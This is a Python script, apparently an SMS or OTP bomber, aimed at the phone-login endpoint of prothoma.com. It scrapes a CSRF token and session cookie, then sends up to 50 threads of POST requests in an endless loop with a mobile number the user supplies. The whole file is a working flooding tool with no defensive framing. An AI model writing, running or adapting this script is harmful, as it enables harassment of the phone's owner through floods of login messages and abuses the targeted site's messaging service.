import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# API-specific variables
login_url = "https://www.prothoma.com/login"
post_url = "https://www.prothoma.com/phonelogin"

# Total requests counter
total_requests = 0

def fetch_csrf_and_session():
    """Fetch CSRF token and session cookie."""
    response = requests.get(login_url)
    soup = BeautifulSoup(response.content, 'html.parser')

    csrf_meta = soup.find('meta', attrs={'name': 'csrf-token'})
    csrf_token = csrf_meta['content'] if csrf_meta else None

    cookies = response.cookies.get_dict()
    session_id = cookies.get('prothoma_session')

    if not csrf_token or not session_id:
        raise Exception("Error: Could not retrieve CSRF token or session cookie.")

    return csrf_token, session_id

def send_request(csrf_token, session_id, mobile):
    """Send a single request to the API."""
    global total_requests
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"prothoma_session={session_id}"
    }

    data = {
        "_token": csrf_token,
        "loginphone": mobile
    }

    try:
        response = requests.post(post_url, headers=headers, data=data)
        if response.status_code == 200:
            total_requests += 1
            print(f"[Prothoma_api] [{total_requests}] : {response.status_code}")
        else:
            print(f"Request failed: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def main(mobile, threads):
    """Main function to run API requests."""
    try:
        csrf_token, session_id = fetch_csrf_and_session()
    except Exception as e:
        print(e)
        return

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_request, csrf_token, session_id, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

# To make this file executable standalone
if __name__ == "__main__":
    mobile = input("Enter mobile number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)